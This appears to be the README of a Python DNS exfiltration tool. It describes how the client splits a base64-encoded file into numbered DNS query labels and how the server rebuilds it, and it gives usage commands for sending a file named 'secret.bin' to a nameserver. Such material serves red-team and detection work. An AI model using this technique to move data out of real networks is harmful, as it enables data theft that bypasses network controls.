## DNS Exfiltration Tool

A Python-based DNS exfiltration tool consisting of a **client** and **server**.
It sends arbitrary file data over DNS queries and reconstructs it on the server
side, which is useful in environments where traditional network communication
methods are restricted.

### Features

- **Client**:
  - Reads arbitrary binary files and base64-encodes them.
  - Splits data into DNS-safe chunks based on label length constraints.
  - Sends chunks as `A` queries with the format `NNN-<base64_chunk>.<domain>`.
  - Rate limiting to avoid overwhelming the server.
  - File and console logging via a central logger.

- **Server**:
  - Listens for DNS queries and extracts base64 chunks from the leading label.
  - Reconstructs the full base64 stream in order and decodes it back to bytes.
  - Writes the decoded data to an output file (binary-safe).
  - Colored console output for better visibility.

- **Configuration**:
  - Central configuration in `config.py` (chunk limits, total size, rate limit, etc.).
  - Logs written to a dedicated `logs` directory.

### Protocol overview

The client and server agree on a very simple protocol:

- The client base64-encodes the raw file bytes.
- The encoded string is split into fixed-size chunks.
- Each chunk is sent in a DNS query name:

  - Leading label: `NNN-<base64_chunk>`
    - `NNN` is a zero-padded chunk ID (`000`, `001`, `002`, ...).
    - `<base64_chunk>` is a slice of the base64 string.
    - The entire leading label length never exceeds 63 characters.
  - Full query name: `NNN-<base64_chunk>.<your_domain>`

- The server:
  - Extracts the leading label from the query name.
  - Splits it into `NNN` and `<base64_chunk>`.
  - Stores each chunk in memory keyed by its `NNN`.
  - After every chunk, reconstructs the ordered base64 stream (`000`, `001`, `002`, ...)
    and attempts to decode it and write the resulting bytes to the output file.

Because everything ultimately operates on **bytes** and base64, both text and
binary files are supported.

### Installation

1. Clone the repository:

```bash
git clone https://github.com/yourusername/DNS-Exfiltration.git
cd DNS-Exfiltration
```

2. Install dependencies:

```bash
pip install -r requirements.txt
```

### Usage

#### 1. Run the server

Start the exfiltration server on the default DNS port:

```bash
python server.py -o output.bin
```

Use a custom port:

```bash
python server.py -o output.bin -p 5353
```

Command line arguments:

- `-o, --output`: Path to the output file (required).
- `-p, --port`: Server listening port (default: 53).

#### 2. Run the client

Point the client at your server (for example, running locally on port 5353):

```bash
python client.py \
  -f secret.bin \
  --nameservers 127.0.0.1 \
  -d example.com \
  -p 5353
```

Client arguments:

- `-f, --file`: Path to the file to exfiltrate (required).
- `--nameservers`: Comma-separated list of nameservers. Default is `127.0.0.1`.
- `-d, --domain`: Domain to query data with (must be handled by the server).
- `-p, --port`: DNS server listening port (default: 53).
- `-c, --config`: Optional path to a configuration file (currently uses defaults).

> **Note**: Make sure your test domain (e.g. `example.com`) is configured so that
> queries are sent to the machine running `server.py` (e.g. via your system DNS
> settings, a local resolver, or hosts/DNS server configuration).

### Configuration

The tool is configured through `config.py` using the `ServerConfig` dataclass.
Key settings include:

- `port`: Default DNS port (used by the server if not overridden via CLI).
- `address`: Listen address for the server (default `0.0.0.0`).
- `max_chunk_size`: Maximum base64 chunk size (capped by DNS label limits).
- `max_total_size`: Maximum total file size in bytes (default 10 MB).
- `chunk_timeout`: Reserved for chunk timeouts (not yet fully used).
- `log_dir`: Directory for log files.
- `output_dir`: Default directory for output files.
- `require_auth` / `auth_key`: Reserved for optional authentication.
- `rate_limit`: Maximum requests per minute (used by the client for pacing).

### Security considerations

- **Rate limiting**: The client enforces a simple rate limit based on
  `rate_limit` to reduce the risk of overloading the DNS server.
- **Size limits**: `max_total_size` prevents excessive memory and disk usage.
- **Input validation**: The server validates chunk IDs and handles malformed
  base64 chunks gracefully without crashing.

### Logging

Logs are stored in the `logs` directory with timestamps. Both file and console
logging are supported, with colored console output for better readability.

### Contributing

Contributions are welcome! Please feel free to submit a Pull Request.

### License

This project is licensed under the MIT License – see the `LICENSE` file for details.